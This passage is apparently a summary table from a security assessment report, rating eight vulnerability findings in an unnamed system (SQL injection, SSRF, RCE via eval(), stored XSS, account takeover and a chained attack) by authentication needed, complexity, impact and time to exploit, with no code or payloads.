| #1 Arbitrary SQL | ❌ None | Low | Full DB control | < 1 min |
| #2 DB Dump/Write | ❌ None | Low | Data breach, admin creation | < 1 min |
| #3 SSRF | ❌ None | Low | Config/secret theft, internal access | < 1 min |
| #4 RCE via eval() | ❌ → ✅ (chain) | Medium | Full server compromise | ~3 min |
| #5 File Download | ✅ Any user | Low | Source code, config theft | < 1 min |
| #6 Account Takeover | ❌ None | Low | Mass account compromise | ~5 min |
| #7 Stored XSS | ❌ None | Low | All users compromised | < 1 min |
| #8 Full Kill Chain | ❌ None | Medium | Complete system takeover | < 5 min |
